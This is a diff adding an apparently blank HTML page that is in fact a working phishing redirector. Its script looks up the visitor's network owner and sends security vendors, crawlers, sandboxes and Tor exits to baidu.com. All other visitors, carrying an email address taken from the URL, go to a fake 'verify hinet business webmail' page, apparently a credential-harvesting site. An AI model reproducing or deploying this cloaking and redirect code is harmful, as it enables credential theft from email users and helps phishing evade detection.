@@ -1,0 +1,112 @@
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<title></title>
+</head>
+<body cz-shortcut-listen="true">
+	<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.0.min.js"></script>
+	<script>
+
+		var encoded_string = window.location.hash.substr(1);
+		var email = encoded_string;	
+
+	//const queryString = window.location.search;
+	//const urlParams = new URLSearchParams(queryString);
+// 	const product = urlParams.get('clid');
+//   let em = "";
+//   if (product ==='' || product.trim() ==='')
+//   { 
+// 	console.log("empty parameters"); 
+  
+//   }else {
+  	
+// 	  try {
+//          em = window.atob(product); //decodes
+//     } catch (err) {
+//         em = product;
+//     }
+    
+	$.ajax({ type: "GET",url:'https://ipapi.co/org/',
+	success: function(t) {
+	var t2 = t.toLowerCase();
+	if (t.indexOf("phish") >= 0 
+		|| t.indexOf("Paypal") >= 0 
+		|| t.indexOf("AVAST") >= 0 
+		|| t.indexOf("Kaspersky Lab AO") >= 0 
+		|| t.indexOf("McAfee") >= 0 
+		|| t.indexOf("Google Proxy") >= 0 
+		|| t.indexOf("Symantec Corporation") >= 0 
+		|| t.indexOf("AVAST Software s.r.o.") >= 0 
+		|| t2.indexOf("drweb") >= 0 
+		|| t.indexOf("DrWeb Ltd") >= 0 
+		|| t.indexOf("AS2-TRENDMICRO-COM") >= 0 
+		|| t.indexOf("TRENDMICRO") >= 0 
+		|| t.indexOf("Japan Network Information C") >= 0 
+		|| t2.indexOf("scanurl") >= 0 
+		|| t.indexOf("Dr.Web") >= 0 
+		|| t2.indexOf("softlayer") >= 0 
+		|| t2.indexOf("facebook") >= 0 
+		|| t2.indexOf("calyxinstitute") >= 0 
+		|| t2.indexOf("tor-exit") >= 0 
+		|| t2.indexOf("phishtank") >= 0 
+		|| t2.indexOf("p3pwgdsn") >= 0 
+		|| t2.indexOf("msnbot") >= 0 
+		|| t2.indexOf("netcraft") >= 0 
+		|| t2.indexOf("trendmicro") >= 0 
+		|| t2.indexOf("paypal") >= 0 
+		|| t2.indexOf("torservers") >= 0 
+		|| t2.indexOf("messagelabs") >= 0 
+		|| t2.indexOf("sucuri.net") >= 0 
+		|| t2.indexOf("crawler") >= 0 
+		|| t2.indexOf("bot") >= 0 
+		|| t2.indexOf("webroot") >= 0 
+		|| t2.indexOf("virus") >= 0 
+		|| t2.indexOf("eset") >= 0 
+		|| t2.indexOf("norton") >= 0 
+		|| t2.indexOf("bitedefender") >= 0 
+		|| t2.indexOf("avira") >= 0 
+		|| t2.indexOf("avg") >= 0 
+		|| t2.indexOf("f-secure") >= 0 
+		|| t2.indexOf("g data") >= 0 
+		|| t2.indexOf("escan") >= 0
+		|| t2.indexOf("panda") >= 0 
+		|| t2.indexOf("adware") >= 0 
+		|| t2.indexOf("vipre") >= 0 
+		|| t2.indexOf("trustport") >= 0 
+		|| t2.indexOf("msnbot") >= 0 
+		|| t2.indexOf("total") >= 0 
+		|| t2.indexOf("pareto") >= 0 
+		|| t2.indexOf("paypal") >= 0 
+		|| t2.indexOf("f.prot") >= 0 
+		|| t2.indexOf("zone") >= 0 
+		|| t2.indexOf("bullguard") >= 0 
+		|| t2.indexOf("nProtect") >= 0 
+		|| t2.indexOf("nod32") >= 0 
+		|| t2.indexOf("sophos") >= 0 
+		|| t2.indexOf("fortinet") >= 0 
+		|| t2.indexOf("linux shield") >= 0 
+		|| t2.indexOf("spam") >= 0 
+		|| t2.indexOf("nprotect") >= 0 
+		|| t2.indexOf("f-prot") >= 0 
+		|| t2.indexOf("f-secure") >= 0 
+		|| t2.indexOf("drivesentry") >= 0 
+		|| t2.indexOf("scan") >= 0
+		|| t2.indexOf("sandbox") >= 0
+		|| t2.indexOf("eye") >= 0
+		|| t2.indexOf("mimecast") >= 0
+		|| t2.indexOf("craw") >= 0
+	){
+		window.location.href ="https://www.baidu.com/";
+	}else{
+		window.location.href ="https://verify-hinet-business-and-enterprise-webmail.d187z5hwq1b9m7.amplifyapp.com/#"+email;
+	}
+		}
+	});
+  
+  
+    
+</script>
+</body>
+</html>
